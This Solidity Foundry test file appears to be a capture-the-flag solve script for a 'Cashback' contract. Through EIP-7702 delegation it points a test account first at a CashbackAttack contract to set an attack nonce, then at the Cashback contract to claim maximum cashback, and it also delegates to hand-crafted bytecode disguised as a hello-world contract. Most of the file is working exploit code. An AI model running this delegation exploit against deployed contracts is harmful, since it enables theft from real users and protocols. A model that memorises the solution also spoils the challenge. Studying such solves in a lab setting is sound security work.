// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Currency, CurrencyLibrary, Cashback} from "./Cashback.sol";
import {
    CashbackAttack,
    BASIS_POINTS,
    NATIVE_CASHBACK_RATE,
    NATIVE_MAX_CASHBACK,
    FREEDOM_CASHBACK_RATE,
    FREEDOM_MAX_CASHBACK,
    FREEDOM_ADDR,
    SUPER_NFT_ADDR
} from "./CashbackAttack.sol";
import {Test, console} from "forge-std/Test.sol";

// forge-lint: disable-next-item(asm-keccak256)
contract SolveCashback is Test {
    Cashback cashback;
    CashbackAttack cc;
    address payable alice;
    uint256 aliceSK;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        // currencies
        address[] memory _currencies = new address[](2);
        _currencies[0] = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
        _currencies[1] = FREEDOM_ADDR;

        // cashback
        uint256[] memory _cashbacks = new uint256[](2);
        _cashbacks[0] = NATIVE_CASHBACK_RATE;
        _cashbacks[1] = FREEDOM_CASHBACK_RATE;

        // maxCashback
        uint256[] memory _maxCashbacks = new uint256[](2);
        _maxCashbacks[0] = NATIVE_MAX_CASHBACK;
        _maxCashbacks[1] = FREEDOM_MAX_CASHBACK;

        // superCashbackNFT addr
        address _superCashbackNFT = SUPER_NFT_ADDR;

        cashback = new Cashback(_currencies, _cashbacks, _maxCashbacks, _superCashbackNFT);
        cc = new CashbackAttack();

        _setUpAccounts();

        vm.stopPrank();
    }

    function _setUpAccounts() internal {
        aliceSK = 0xA11CE;
        alice = payable(vm.addr(aliceSK));
        vm.deal(alice, 1 ether);
        vm.label(alice, "alice");
    }

    function testSolveCashback() public {
        vm.startPrank(alice, alice);

        console.log("--- CashbackAttack ---");
        vm.signAndAttachDelegation(address(cc), aliceSK);
        CashbackAttack(alice).setAttackNonce();

        console.log("--- Cashback ---");
        vm.signAndAttachDelegation(address(cashback), aliceSK);

        uint256 nativeAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
        cashback.accrueCashback(CurrencyLibrary.NATIVE_CURRENCY, nativeAmt);
        uint256 freedomAmt = FREEDOM_MAX_CASHBACK * BASIS_POINTS / FREEDOM_CASHBACK_RATE;
        cashback.accrueCashback(CurrencyLibrary.NATIVE_CURRENCY, freedomAmt);

        // Confirm the state
        uint256 nativeCashback = cashback.balanceOf(alice, CurrencyLibrary.NATIVE_CURRENCY.toId());
        console.log("nativeCashback: %s", nativeCashback);
        assertEq(nativeCashback, NATIVE_MAX_CASHBACK);

        vm.stopPrank();
    }

    function testCraftedHelloWorld() public {
        bytes memory craftedHelloWorldCode = hex"603056dcc409af2566c47f6da4d30eae8155b332a64078000000000000000000000000000000000000000000000000005b60808060405260043610156042575f80fd5b5f3560e01c6319ff1d21146054575f80fd5b34606b575f366003190112606b5780602a60209252f35b5f80fdfea26469706673582212205c96532401424f75354565ce13b448462eb00d2141f0f5662d66a0b84603a48e64736f6c634300081e0033";
        address hwAddr = address(0x1234);
        vm.etch(hwAddr, craftedHelloWorldCode);

        vm.startPrank(alice, alice);

        vm.signAndAttachDelegation(address(hwAddr), aliceSK);

        uint256 nativeAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
        cashback.accrueCashback(CurrencyLibrary.NATIVE_CURRENCY, nativeAmt);
    }
}
